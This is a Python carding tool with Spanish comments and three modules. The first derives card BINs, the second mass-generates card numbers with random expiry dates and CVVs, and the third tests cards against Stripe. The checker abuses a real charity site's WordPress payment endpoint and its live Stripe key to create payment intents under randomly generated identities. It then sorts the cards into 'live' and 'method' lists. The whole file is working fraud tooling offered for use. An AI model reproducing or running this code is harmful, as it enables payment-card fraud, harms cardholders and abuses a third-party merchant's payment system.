#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from termcolor import *
import requests
import json
import sys
import uuid
import urllib3
from random import *
import subprocess
import os

banner = """               ~<WWWWWWWbo
                 WWWP~~+WWb
    ~<WWWWWWWbo  WWW   WWWW~WWWoWb
     :WWWP~~+WWb WWW   WWWW WWW "P
     :WWW   WWWW WWW   WWWW WWW
     :WWW   WWWP WWWbodWWWP WWW
     :WWW-=OWWP jWWWWWWWWP jWWWL
     :WWW
     :WWW .dW~b.<WWWWWWbo <WWWWWWbo .dW~b.~WWWoWb
     :WWW.:W  B' WWW   WWb WWW   WWb:W  B' WWW "P
     ;WWW; OW~   WWW   WWW WWW   WWW OW~   WWW
    .dWWWb.`dOP" WWW~oOWP  WWW~oOWP  `dOP"jWWWL
YHHHHHHHHHHHHHHH WWW HHHHH WWW HHHHHHHHHHHHHHHHHHHH
 YHHHHHHHHHHHHHH WWW HHHHH WWW HHHHHHHHHHHHHHHHHHH
               .dWWWb.   .dWWWb.\n"""

modulos = """[1] Extrapolacion Compleja\n
[2] Generacion de CCs\n
[3] Checker de CCs\n
[4] Salir\n
Selecciona un modulo: """

banner1 = """ _____________________
|  _________________  |
| | LA CHOFIS 7u7 . | |
| |_________________| |
|  ___ ___ ___   ___  |
| | 7 | 8 | 9 | | + | |
| |___|___|___| |___| |
| | 4 | 5 | 6 | | - | |
| |___|___|___| |___| |
| | 1 | 2 | 3 | | x | |
| |___|___|___| |___| |
| | . | 0 | = | | / | |
| |___|___|___| |___| |
|_____________________|"""

def chofis():
    print(colored(banner1, "blue"))
    print("\nEjemplo de BIN: 5365956336295881")
    cc1 = input(colored("\nIngresa una CC: ", "yellow"))
    print("\nEjemplo de BIN: 5365956336200247")
    cc2 = input(colored("\nIngresa otra CC: ", "yellow"))
    tres1 = cc1[9:11]
    tres2 = cc2[9:11]
    t1 = 0
    t2 = 0
    for n in tres1:
        t1 = t1 + int(n)
    for n in tres2:
        t2 = t2 + int(n)
    t1 = t1 / 2
    t2 = t2 / 2
    t1 = t1 * 5.
    t2 = t2 * 5.
    t1 = int(t1)
    t2 = int(t2)
    r = t1 + t2
    b = cc1[0:8]
    print(colored("\n---------------------------", "green"))
    print(colored("Tu BIN es:", "green"), colored(b + "{}{}".format(r,"XXXXXX")))
    print(colored("---------------------------", "green"))

banner2 = """                             000      00
                           0000000   0000
              0      00  00000000000000000
            0000 0  000000000000000000000000       0
         000000000000000000000000000000000000000 000
        0000000000000000000000000000000000000000000000
    000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000
              / / / / / / / / / / / / / / / /
            / / / / / / / / / / / / / / /
            / / / / / / / / / / / / / / /
          / / / / / / / / / / / / / /
          / / / / / / / / / / / / /
        / / / / / / / / / / / /
        / / / / / / / / / /

         ...........CC RAIN OwO!."""

def rain():
    global gmm
    global gyy
    global gcvv
    global gcc
    print(colored(banner2, "blue"))
    print("\nEjemplo de BIN: 53659563362XXXXX")
    bin = input(colored("Ingresa BIN: ", "yellow"))
    print("\nEjemplo de Mes: 05 o da ENTER para numero Random")
    mm = input(colored("Ingresa mes: ", "yellow"))
    print("\nEjemplo de Año: 2020 o da ENTER para numero Random")
    yy = input(colored("Ingresa año: ", "yellow"))
    print("\nEjemplo de CVV: 152 o da ENTER para numero Random")
    cvv = input(colored("Ingresa CVV: ", "yellow"))
    print("\nEjemplo de nombre: rojas.txt")
    archivo = input(colored("Ingresa el nombre del archivo para las CCs: ", "yellow"))
    print("\nEjemplo de cantidad: 50")
    cantidad = int(input(colored("Ingresa la cantidad de CCs: ", "yellow")))
    print(colored("\nGenerando ....\n", "magenta"))
    for n in range(cantidad):
        gcc = ""
        for l in bin:
            l = l.replace("X", str(randint(0,9)))
            gcc = gcc + l
        if mm == "":
            gmm = str(choice(["01","02","03","04","05","06","07","08","09","10","11","12"]))
        else:
            gmm = str(mm)
        if yy == "":
            gyy = str(choice(["2021","2022","2023","2024","2025","2026"]))
        else:
            gyy = str(yy)
        if cvv == "":
            gcvv = str(randint(100,999))
        else:
            gcvv = str(cvv)
        datos = "{}|{}|{}|{}".format(gcc, gmm, gyy, gcvv)
        print(colored(datos, "green"))
        with open(archivo, "a") as f:
            f.write(datos+"\n")
    print("\n")

banner3 = """
 ,,╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓╓,
 █████████████████████████████████████████⌐
 ███████████████████▌Queen Bank UWU ▐█████H
 █████████████████████████████████████████H
 █████##########██████████████████████████H
 █████##########██████████████████████████H
 █████##########██████████████████████████H
 █████████████████████████████████████████H
 ████▌5365    9563    3620    3352 ███████H
 █████▓█▓█▓█▓███▓█▓█▓█▓███▓█▓█▓███████████H
 ██████████████████████████  QUEEN  ██████H
 █████▄▄▄▄▄▄▄▄▓████████████  BANK   ██████H
 █████████████████████████████████████████H
 ╙▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀*
"""

def queencheck():
    #mostramos el banner
    print(colored(banner3, "red"))
    #mostramos formato
    print(colored('Formato: CC|mm|yy|cvv\n\nEjemplo: 5365956336203352|08|2025|152\n', "yellow"))
    #mostramos formato
    print(colored("Guarda las CC en un archivo .txt\n", "yellow"))
    #solicitamo una lista de cc
    CCList=open(input('Archivo .txt con CCs: '),'r').read().splitlines()
    #recorremos las CC
    for i in CCList:
        cc=i.split('|')[0]
        mm=i.split('|')[1]
        yy=i.split('|')[2]
        cvv=i.split('|')[3]
        #tratamos de usar la funcion principal
        try:
            #llamamos a la funcion principal
            chequeo(cc,mm,yy,cvv)
        #en caso de que no...
        except:
            #mostramos un error
            print(colored("Ocurrio un error con la CC{}\n".format(cc), "red"))
            #tratamos de usar la funcion principal
            try:
                #llamamos a la funcion principal
                chequeo(cc,mm,yy,cvv)
            #en caso de que no...
            except:
                #mostramos un error
                print(colored("Ocurrio un error con la CC{}\n".format(cc), "red"))
                #tratamos de usar la funcion principal
                try:
                    #llamamos a la funcion principal
                    chequeo(cc,mm,yy,cvv)
                #en caso de que no...
                except:
                    #mostramos un error
                    print(colored("Ocurrio un error con la CC{}\n".format(cc), "red"))
    #leamos las cc vivas
    with open("cc_vivas.txt", "r") as f:
        print("--------CCs Vivas!!--------")
        vivas = f.read()
        print(colored(vivas, "green"))
        print("---------------------------")
    #leamos las cc vivas
    with open("cc_metodo.txt", "r") as f:
        print("------CCs Metodo!!!-------")
        vivas = f.read()
        print(colored(vivas, "yellow"))
        print("---------------------------")

def chequeo(cc, mm, yy, cvv):
    #variables de prueba
    pcc = cc
    pmm = mm
    pyy = yy
    pcvv = cvv
    #mostramos la CC a usar
    print(colored("Probando CC: ", "blue"), cc, "\n")
    #mostramos en que paso vamos
    print(colored('[+] Paso 1 en proceso....', "yellow"))
    #creamos una cabecera
    head1={
    'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Pragma':'no-cache',
    'Accept':'*/*',
    }
    #hacemos una solicitud
    response1 = requests.get('https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US',headers=head1).json()
    #mostramos datos
    for x in response1['results']:
        print(colored('[*]Informacion Generada:', "magenta"))
        name=x['name']['first']
        second=x['name']['last']
        email=(name+second+'@outlook.com').lower()
        fullname=name + ' ' + second
        print(colored('[-] Nombre: ', "blue"), name)
        print(colored('[-] Apellido: ', "blue"), second)
        print(colored('[-] Nombre Completo: ', "blue"), fullname)
        print(colored('[-] Email: ', "blue"), email)
        print(colored('------------------------\n', "magenta"))
        #mostramos en que paso vamos
        print(colored('[+] Paso 2 en proceso....', "yellow"))
        cookies2 = {'content-type':'application/x-www-form-urlencoded',}
        #hacemos una solicitud
        Guid=str(requests.post('https://m.stripe.com/4',headers=head1,cookies=cookies2).text)
        Muid=str(uuid.uuid1())
        Sid=str(uuid.uuid1())
        print(colored('[*]Informacion Generada:', "magenta"))
        print(colored('[-] Guid: ', "blue"), Guid)
        print(colored('[-] Muid: ', "blue"), Muid)
        print(colored('[-] Sid: ', "blue"), Sid)
        print(colored('------------------------\n', "magenta"))
        #mostramos en que paso vamos
        print(colored('[+] Paso 3 en proceso....', "yellow"))
        cookies3 = {
        'content-type':'application/x-www-form-urlencoded',
        'user-agent':'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36',
        }
        data3={
        'action': 'asp_pp_req_token',
        'amount': '100',
        'curr': 'USD',
        'product_id': '330',
        'quantity': '1',
        'billing_details': {'name':str(fullname),'email':str(email)},
        }
        #hacemos una solicitud
        response3 = requests.post('https://elevatedbygrace.org/wp-admin/admin-ajax.php',data=data3,cookies=cookies3)
        amir=response3.json()
        client=str(amir['clientSecret'])
        pid=str(amir['pi_id'])
        print(colored('[*]Informacion Generada:', "magenta"))
        print(colored('[-] Cliente: ', "blue"), client)
        print(colored('[-] PID: ', "blue"), pid)
        print(colored('------------------------\n', "magenta"))
        #mostramos en que paso vamos
        print(colored('[+] Paso 4 en proceso....', "yellow"))
        data4={
        'save_payment_method':'true',
        'setup_future_usage':'off_session',
        'payment_method_data[type]':'card',
        'payment_method_data[billing_details][name]':fullname,
        'payment_method_data[billing_details][email]':email,
        'payment_method_data[card][number]':str(cc),
        'payment_method_data[card][cvc]':str(cvv),
        'payment_method_data[card][exp_month]':str(mm),
        'payment_method_data[card][exp_year]':str(yy),
        'payment_method_data[guid]':Guid,
         'payment_method_data[muid]':Muid,
        'payment_method_data[sid]':Sid,
        'payment_method_data[pasted_fields]':'number',
        'payment_method_data[payment_user_agent]':'stripe.js%2F3c236fed%3B+stripe-js-v3%2F3c236fed',
        'payment_method_data[time_on_page]':'40371',
        'payment_method_data[referrer]':'https%3A%2F%2Felevatedbygrace.org%2F%3Fasp_action%3Dshow_pp%26product_id%3D330',
        'expected_payment_method_type':'card',
        'use_stripe_sdk':'true',
        'key':'pk_live_Alme0DgBmyGhR4EGURpxR0Xy',
        'client_secret':client,
        }
        cookies4 = {
        'content-type':'application/x-www-form-urlencoded',
        }
        head4={
        'accept': 'application/json',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'content-length': '1012',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/v3/controller-52375fd2df5c19565f60d66a345a1bff.html',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36',
        }
        #hacemos una solicitud
        #hacemos una solicitud
        response4 = requests.post('https://api.stripe.com/v1/payment_intents/'+pid+'/confirm',data=data4,headers=head4,cookies=cookies4).json()
        #verificamos si la CC esta muerta
        print(colored("\n-----------------", "yellow"))
        print(colored(response4["error"]["message"], "yellow"))
        #print(colored(response4["message"], "yellow"))
        print(colored("-----------------\n", "yellow"))
        if response4['error']['message'] in ['Your card number is incorrect.','Your card was declined.','Your card has expired.']:
            print(colored("--------CC MUERTA--------", "red"))
            print('[-] Result = '+response4['error']['message'])
            try:
                print('[-] Reason = '+response4['error']['decline_code'])
            except:
                pass
            print(colored("-------------------------\n", "red"))
        if response4['error']['decline_code'] in ["generic_decline"] and response4['error']['message'] in ["Your card was declined."]:
            print(colored("#########METODO#########", "green"))
            with open("cc_metodo.txt", "a") as v:
                v.write(str(cc)+'|'+mm+'|'+yy+'|'+cvv+'\n')
            print(colored("#######################", "green"))
        #segunda condicional
        elif response4['error']['message'] in ["Your card's expiration month is invalid."]:
            print(colored("----CC Posible VIVA----", "cyan"))
            open('cc_sospechosas.txt','a+').write(str(cc)+'|'+mm+'|'+yy+'|'+cvv+'\n')
            for mes in ["01","02","03","04","05","06","07","08","09","10","11","12"]:
                chequeo_mes(cc, mes, yy, cvv)
        elif ["Invalid email address:"] in response4['error']['message']:
            print(colored("----ERROR Email----", "red"))
            chequeo(cc, mm, yy, cvv)
        #y si no... 'Your card number is incorrect.',
        else:
            print(colored("--------CC VIVA---------", "green"))
            print('[+] '+str(cc)+' Valida')
            open('cc_vivas.txt','a+').write(str(cc)+'|'+mm+'|'+yy+'|'+cvv+'\n')
            print(colored("-------------------------\n", "green"))

def chequeo_mes(cc, mm, yy, cvv):
    #variables de prueba
    pcc = cc
    pmm = mm
    pyy = yy
    pcvv = cvv
    #mostramos la CC a usar
    print(colored("Probando CC: ", "blue"), cc, "\n")
    #mostramos en que paso vamos
    print(colored('[+] Paso 1 en proceso....', "yellow"))
    #creamos una cabecera
    head1={
    'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Pragma':'no-cache',
    'Accept':'*/*',
    }
    #hacemos una solicitud
    response1 = requests.get('https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US',headers=head1).json()
    #mostramos datos
    for x in response1['results']:
        print(colored('[*]Informacion Generada:', "magenta"))
        name=x['name']['first']
        second=x['name']['last']
        email=(name+second+'@outlook.com').lower()
        fullname=name + ' ' + second
        print(colored('[-] Nombre: ', "blue"), name)
        print(colored('[-] Apellido: ', "blue"), second)
        print(colored('[-] Nombre Completo: ', "blue"), fullname)
        print(colored('[-] Email: ', "blue"), email)
        print(colored('------------------------\n', "magenta"))
        #mostramos en que paso vamos
        print(colored('[+] Paso 2 en proceso....', "yellow"))
        cookies2 = {'content-type':'application/x-www-form-urlencoded',}
        #hacemos una solicitud
        Guid=str(requests.post('https://m.stripe.com/4',headers=head1,cookies=cookies2).text)
        Muid=str(uuid.uuid1())
        Sid=str(uuid.uuid1())
        print(colored('[*]Informacion Generada:', "magenta"))
        print(colored('[-] Guid: ', "blue"), Guid)
        print(colored('[-] Muid: ', "blue"), Muid)
        print(colored('[-] Sid: ', "blue"), Sid)
        print(colored('------------------------\n', "magenta"))
        #mostramos en que paso vamos
        print(colored('[+] Paso 3 en proceso....', "yellow"))
        cookies3 = {
        'content-type':'application/x-www-form-urlencoded',
        'user-agent':'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36',
        }
        data3={
        'action': 'asp_pp_req_token',
        'amount': '100',
        'curr': 'USD',
        'product_id': '330',
        'quantity': '1',
        'billing_details': {'name':str(fullname),'email':str(email)},
        }
        #hacemos una solicitud
        response3 = requests.post('https://elevatedbygrace.org/wp-admin/admin-ajax.php',data=data3,cookies=cookies3)
        amir=response3.json()
        client=str(amir['clientSecret'])
        pid=str(amir['pi_id'])
        print(colored('[*]Informacion Generada:', "magenta"))
        print(colored('[-] Cliente: ', "blue"), client)
        print(colored('[-] PID: ', "blue"), pid)
        print(colored('------------------------\n', "magenta"))
        #mostramos en que paso vamos
        print(colored('[+] Paso 4 en proceso....', "yellow"))
        data4={
        'save_payment_method':'true',
        'setup_future_usage':'off_session',
        'payment_method_data[type]':'card',
        'payment_method_data[billing_details][name]':fullname,
        'payment_method_data[billing_details][email]':email,
        'payment_method_data[card][number]':str(cc),
        'payment_method_data[card][cvc]':str(cvv),
        'payment_method_data[card][exp_month]':str(mm),
        'payment_method_data[card][exp_year]':str(yy),
        'payment_method_data[guid]':Guid,
         'payment_method_data[muid]':Muid,
        'payment_method_data[sid]':Sid,
        'payment_method_data[pasted_fields]':'number',
        'payment_method_data[payment_user_agent]':'stripe.js%2F3c236fed%3B+stripe-js-v3%2F3c236fed',
        'payment_method_data[time_on_page]':'40371',
        'payment_method_data[referrer]':'https%3A%2F%2Felevatedbygrace.org%2F%3Fasp_action%3Dshow_pp%26product_id%3D330',
        'expected_payment_method_type':'card',
        'use_stripe_sdk':'true',
        'key':'pk_live_Alme0DgBmyGhR4EGURpxR0Xy',
        'client_secret':client,
        }
        cookies4 = {
        'content-type':'application/x-www-form-urlencoded',
        }
        head4={
        'accept': 'application/json',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'content-length': '1012',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/v3/controller-52375fd2df5c19565f60d66a345a1bff.html',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36',
        }
        #hacemos una solicitud
        #hacemos una solicitud
        response4 = requests.post('https://api.stripe.com/v1/payment_intents/'+pid+'/confirm',data=data4,headers=head4,cookies=cookies4).json()
        #verificamos si la CC esta muerta
        print(colored("\n-----------------", "yellow"))
        print(colored(response4["error"]["message"], "yellow"))
        #print(colored(response4["message"], "yellow"))
        print(colored("-----------------\n", "yellow"))
        if response4['error']['message'] in ["Your card's expiration month is invalid.",'Your card number is incorrect.','Your card was declined.','Your card has expired.']:
            print(colored("---ERROR DE MES O FRAUDE----", "red"))
            print('[-] Result = '+response4['error']['message'])
            try:
                print('[-] Reason = '+response4['error']['decline_code'])
            except:
                pass
            print(colored("-------------------------\n", "red"))
        #y si no... 'Your card number is incorrect.',
        else:
            print(colored("--------CC VIVA---------", "green"))
            print('[+] '+str(cc)+' Valida')
            open('cc_vivas.txt','a+').write(str(cc)+'|'+mm+'|'+yy+'|'+cvv+'\n')
            print(colored("-------------------------\n", "green"))

def main():
    while True:
        subprocess.run("clear", shell=True)
        print(banner)
        modulo = input(colored(modulos, "blue"))
        if modulo == "1":
            subprocess.run("clear", shell=True)
            chofis()
            input("Presiona ENTER para continuar")
        elif modulo == "2":
            subprocess.run("clear", shell=True)
            rain()
            input("Presiona ENTER para continuar")
        elif modulo == "3":
            with open("cc_metodo.txt", "w") as viv:
                pass
            #creamos archivo
            with open("cc_vivas.txt", "w") as viv:
                pass
            #creamos archivo
            with open("cc_sospechosas.txt", "w") as sos:
                pass
            subprocess.run("clear", shell=True)
            queencheck()
            input("Presiona ENTER para continuar")
        elif modulo == "4":
            subprocess.run("clear", shell=True)
            sys.exit("Bye Bye")
        else:
            print(colored("Modulo desconocido!!!", "red"))

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        sys.exit("Bye Bye UwU")
